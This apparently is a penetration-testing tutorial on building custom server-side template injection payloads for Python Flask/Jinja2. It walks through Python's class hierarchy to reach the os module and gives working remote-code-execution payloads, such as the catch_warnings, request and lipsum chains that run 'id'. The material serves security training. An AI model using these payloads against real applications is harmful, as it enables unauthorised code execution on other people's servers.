There will be times where we will be needing to construct a custom payload to exploit SSTI vulnerabilities. For example, a template engine that executes templates inside a sandbox, which can make exploitation difficult or impossible.
## Navigating Python Objects and Inheritance Trees
In Python, everything is an object! While this is a fundamental property and feature of the language, we are going to focus on one very particular thing one can do: navigating the inheritance tree of objects and, thus, classes.

1. The first step is to open up a Python environment and understand Python's hierarchy. Using `__mro__` or `mro()`, we can go back up the three of inherited objects in the Python environment.
```python
import flask

s = 'HTB'
s.__class__.mro()[1].__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```
2. Next is to look for useful classes that can facilitate remote code execution. We can use the following function to do so:
```python
def searchfunc(name):
     x = s.__class__.mro()[1].__subclasses__()
     for i in range(len(x)):
        fn = x[i].__name__
        if fn.find(name) > -1:
            print(i, fn)

searchfunc('warning')
```
The reason we are searching for `warning` is because, this class imports Python's `sys` module, and from `sys`, we can reach the `os` module.
> Note: This is not the only module that can be used for SSTI exploitation. For example, the `_io._IOBase` module can be utilized to read local files. Read more [here](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/).

3. We will now attempt to reach the `import` by walking through the hierarchy.
```python
x = s.__class__.mro()[1].__subclasses__()
y = x[VALUE] # Note: Replace "VALUE" with the actual integer result from searchfunc

z = y()._module.__builtins__
for i in z:
	if i.find('import') > -1:
		print(i, z[i])
```
4. Test for RCE
```python
y()._module.__builtins__['__import__']('os').system('echo RCE')
```
## Custom Jinja2 Payload
We can replicate the steps above to achieve RCE using custom payload in Jinja template.

1. To test, we can start with the following payload
```python
{{ ''.__class__.__mro__ }}
```
2. Once confirmed, show all subclasses or retrieve the total number of subclasses
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()|length }}
```
3. To make step 2 easier, we can just craft a for loop to put index on all subclasses.
```python
{% for i in range(454) %} {{i}} {{''.__class__.__mro__[1].__subclasses__()[i].__name__}} {% endfor %}

# Note: The value of range() should be the total length of subclasses.
```
4. Again, we will be looking for `catch_warnings` subclass. Once we have identified its index number, we can now craft our final payload to achieve RCE.
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system('id')}}
```

Additionally, we can also use specific Jinja2's specific functions to exploit SSTI vulnerabilities. These are the `request` and `lipsum`:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```python
{{lipsum.__globals__.os.popen('id').read()}}
```